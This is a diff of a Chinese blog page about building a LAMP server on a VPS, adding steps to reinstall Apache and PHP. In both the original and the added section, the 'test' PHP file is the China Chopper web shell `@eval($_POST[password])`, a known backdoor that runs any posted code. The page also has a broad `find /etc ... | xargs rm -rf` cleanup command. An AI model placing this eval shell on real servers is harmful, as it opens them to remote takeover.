@@ -49,7 +49,7 @@ apt-get inst">
 apt-get install mysql-server-5.5           #安装过程中需要输入root用户密码
 apt-get install php5 libapache2-mod-php5
 apt-get inst">
-<meta property="og:updated_time" content="2015-11-20T09:38:19.284Z">
+<meta property="og:updated_time" content="2015-12-09T09:13:18.744Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="VPS使用记录-APACHE+PHP+MYSQL环境搭建">
 <meta name="twitter:description" content="之前搭建过一回用的的LAMP一键安装SHELL脚本，也不明白其中的过程，在这里把分部搭建的过程记录下来加深理解。
@@ -247,9 +247,30 @@ apt-<span class="keyword">get</span> <span class="keyword">install</span> php5 l
 apt-<span class="keyword">get</span> <span class="keyword">install</span> libapache2-<span class="keyword">mod</span>-auth-mysql
 apt-<span class="keyword">get</span> <span class="keyword">install</span> php5-mysql
 /etc/init.<span class="keyword">d</span>/apache2 restart                    #重启
+/etc/apache2/apache.conf                     #配置文件
 /<span class="keyword">var</span>/www/                                      #根目录</span>
 </code></pre><p>添加如下php文件进行测试，看看能否正常解析</p>
 <pre><code><span class="php"><span class="preprocessor">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[password]);<span class="preprocessor">?&gt;</span></span>            #菜刀连接
+</code></pre><h2 id="Apache重新安装">Apache重新安装</h2><pre><code>apt-<span class="keyword">get</span> <span class="comment">--purge autoremove apache*</span>
+find /etc -<span class="property">name</span> <span class="string">"*apache*"</span> |xargs  rm -rf                  <span class="comment">#搜索并删除</span>
+dpkg -l |grep apache2|awk '{print $<span class="number">2</span>}'|xargs dpkg -P     <span class="comment">#删除关联</span>
+dpkg -l |grep apache2                                    <span class="comment">#看看是否还存在关联信息</span>
+apt-<span class="keyword">get</span> install    apache2                                 <span class="comment">#安装</span>
+</code></pre><p>这里安完了会报两行错<br>错误1：    AH00557: apache2: apr_sockaddr_info_get() failed for FengServer</p>
+<pre><code>hostname        <span class="preprocessor">#查看主机名</span>
+vim /etc/hosts  添加如下信息 
+<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>       FengServer
+</code></pre><p>错误2：AH00558: apache2: Could not reliably determine the server’s fully qualified domain name, using 127.0.0.1. Set the ‘ServerName’ directive globally to suppress this message</p>
+<pre><code><span class="title">vim</span> /etc/apache2/apache.conf <span class="comment">#添加如下信息</span>
+ServerName FengServer <span class="comment">#主机名为 - FengServer</span>
+</code></pre><p>安完发现php又报错，真是日了狗了~</p>
+<h2 id="php重新安装">php重新安装</h2><pre><code>apt-<span class="built_in">get</span> <span class="comment">--purge remove libapache2-mod-php5 php5 php5-gd php5-mysql</span>
+apt-<span class="built_in">get</span> autoremove php5
+dpkg -l|grep php| awk <span class="string">'{print $2}'</span>|xargs dpkg -P    <span class="comment">#删除关联</span>
+dpkg -l|grep php                                     <span class="comment">#检查是否有残余</span>
+dpkg -l|grep php5                                
+apt-<span class="built_in">get</span> install php5 libapache2-<span class="operator">mod</span>-php5            <span class="comment">#只安装一个php5会出问题</span>
+<span class="preprocessor">&lt;?</span>php @eval(<span class="variable">$_POST</span>[password]);<span class="preprocessor">?&gt;</span>                    <span class="comment">#菜刀连接，测试能够正常解析</span>
 </code></pre><h2 id="mysql远程连接配置">mysql远程连接配置</h2><pre><code>netstat -anl | <span class="keyword">grep</span> <span class="number">3306</span>     #mysql默认不允许远程连接
 在/etc/mysql/my.<span class="keyword">cnf</span>文件下找到如下代码
 /etc/mysql/my.<span class="keyword">cnf</span>
@@ -439,7 +460,7 @@ mysql -<span class="keyword">h</span> IP -uUsername -pPassword #-<span class="ke
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#安装过程"><span class="nav-number">1.</span> <span class="nav-text">安装过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql远程连接配置"><span class="nav-number">2.</span> <span class="nav-text">mysql远程连接配置</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#安装过程"><span class="nav-number">1.</span> <span class="nav-text">安装过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache重新安装"><span class="nav-number">2.</span> <span class="nav-text">Apache重新安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php重新安装"><span class="nav-number">3.</span> <span class="nav-text">php重新安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql远程连接配置"><span class="nav-number">4.</span> <span class="nav-text">mysql远程连接配置</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
